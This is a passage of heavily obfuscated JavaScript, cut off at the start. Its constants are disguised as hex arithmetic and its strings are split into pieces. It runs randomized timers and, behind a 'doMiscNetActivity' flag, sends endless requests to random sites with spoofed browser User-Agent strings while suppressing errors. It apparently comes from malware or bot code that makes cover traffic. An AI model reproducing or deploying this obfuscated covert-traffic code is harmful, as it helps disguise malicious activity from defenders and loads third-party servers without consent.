      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xbe3 * 0x1 + -0x1 * 0x2141 + 0x2d24; k < -0x4d2 + 0x1da9 + -0x18d3; k++)
    setTimeout(f, (-0x11a61 * -0x1 + 0xdf25 + -0x10f26) * k * getRandomInt(-0x14e1 + -0x1f * 0x109 + 0x1 * 0x34f9, -0x1be * -0x1 + 0x950 * -0x2 + 0x19 * 0xad));
  setInterval(() => {
    f();
    for (let l = 0x313 * 0x1 + 0x1c7 * 0x7 + -0xf84; l < -0x812 + -0x2 * -0x4ae + -0x146 * 0x1; l++)
      setTimeout(f, (0x73e * -0xa + 0xbd08 + 0x3ae2 * 0x2) * l * getRandomInt(0x1389 * 0x1 + -0x8ab * 0x1 + -0xadd * 0x1, -0xfd + -0x247e + 0x257e));
  }, -0x3a * 0x1358e + 0x1 * -0x4e4862 + 0x3c405 * 0x36);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x25ff + -0x2 * -0x2bb + 0x3be1 * 0x1) * getRandomInt(-0x18b * -0xd + -0x2357 + -0x2b * -0x5b, 0x4be * 0x4 + 0x18cf * -0x1 + 0x5dc));
}, -0xf19 + -0x1e42 + 0x31 * 0xef);